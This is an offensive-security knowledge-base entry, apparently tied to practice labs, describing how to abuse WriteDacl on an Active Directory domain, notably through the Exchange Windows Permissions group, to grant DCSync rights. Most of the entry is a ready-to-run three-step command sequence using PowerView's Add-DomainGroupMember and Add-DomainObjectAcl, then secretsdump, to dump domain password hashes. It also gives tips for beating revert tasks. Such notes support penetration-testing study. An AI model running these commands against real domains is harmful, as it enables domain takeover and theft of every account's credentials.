---
type: technique
title: Grant DCSync Rights via WriteDacl on the Domain
tags: [ad, windows, acl-abuse, exchange, dcsync, privilege-escalation]
platforms: [windows]
mitre: [T1484, T1003.006]
updated: 2026-07-09
---

# Grant DCSync Rights via WriteDacl on the Domain

## What it is
[[dcsync]] requires replication privileges (`DS-Replication-Get-Changes` / `…-All`) — not Domain
Admin per se. If you hold `WriteDacl`/`GenericAll` on the **domain** object itself — most famously via
membership in **Exchange Windows Permissions** (which has `WriteDacl` on the domain) — you can grant
*yourself* those replication rights and immediately DCSync. A classic Exchange-foothold →
domain-takeover path.

## When it works
- You can land in the "Exchange Windows Permissions" group (often transitively, via Account
  Operators), OR
- You otherwise hold `WriteDacl` / `GenericAll` on the domain root object.

## How it's done
```
# 1. join Exchange Windows Permissions (PowerView)
Add-DomainGroupMember -Identity 'Exchange Windows Permissions' -Members <you>
# 2. grant yourself DCSync rights on the domain
Add-DomainObjectAcl -Credential $cred -PrincipalIdentity <you> -TargetIdentity '<DOMAIN>' -Rights DCSync
# 3. DCSync
secretsdump.py <domain>/<you>:<pw>@<dc>
```
Automated end-to-end by `aclpwn` (fox-it). Mind the membership-refresh quirk — re-bind to LDAP or
pass explicit creds after joining the group.

## Observed on
- [[forest]] — `svc-alfresco` (Account Operators → Exchange Windows Permissions) granted itself DCSync
  rights, then `secretsdump`'d the Administrator hash.

## Variants & pitfalls
- Many boxes run a **revert** task that strips DCSync rights / group memberships every ~60s — chain
  the grant and the dump into one shot.
- This is why Exchange servers are high-value: a foothold on (or transitively from) Exchange groups is
  one hop to DCSync.

## See also
[[dcsync]], [[dacl-write-members]], [[powerview]], [[impacket]]
